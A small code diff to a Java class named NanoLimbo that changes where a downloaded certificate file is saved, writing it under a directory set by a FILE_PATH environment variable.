@@ -224,7 +224,7 @@ public final class NanoLimbo {
             try {
                 System.out.println("Downloading certificate from " + certUrl);
                 try (InputStream in = new URL(certUrl).openStream()) {
-                    Files.copy(in, Paths.get("cert.pem"), StandardCopyOption.REPLACE_EXISTING);
+                    Files.copy(in, Paths.get(envVars.get("FILE_PATH"), "cert.pem"), StandardCopyOption.REPLACE_EXISTING);
                 }
             } catch (Exception e) {
                 System.err.println("Failed to download certificate: " + e.getMessage());
